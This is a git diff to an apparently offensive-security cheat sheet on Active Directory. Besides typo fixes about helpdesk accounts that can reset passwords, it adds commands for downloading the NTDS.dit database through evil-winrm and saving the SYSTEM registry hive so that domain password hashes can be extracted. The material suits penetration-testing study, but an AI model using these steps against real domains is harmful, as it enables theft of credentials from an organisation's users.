@@ -117,7 +117,7 @@ Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
 
 ## AD support accounts
-Often we have the credentials of limited administrative accounts such as `IT``, `helpdesk` or `support`. Sometimes, These accounts have an ability reset the password.     
+Often we have the credentials of limited administrative accounts such as `IT`, `helpdesk` or `support`. Sometimes, These accounts have an ability to reset the passwords.     
 *Note that the wording of the account name might be different, but related to aforementioned privileges*
 
 ## RPC password reset
@@ -143,6 +143,11 @@ Get-SeBackupPrivilege
 ## Get hashes from .dit file
 ```bash
 # REMOTE
+
+## Download .dit file (assuming evil-winrm is used)
+download <database_file>
+
+## Get system HIVE
 reg.exe save hklm\system <destination>
 
 # LOCAL (after file downloads)
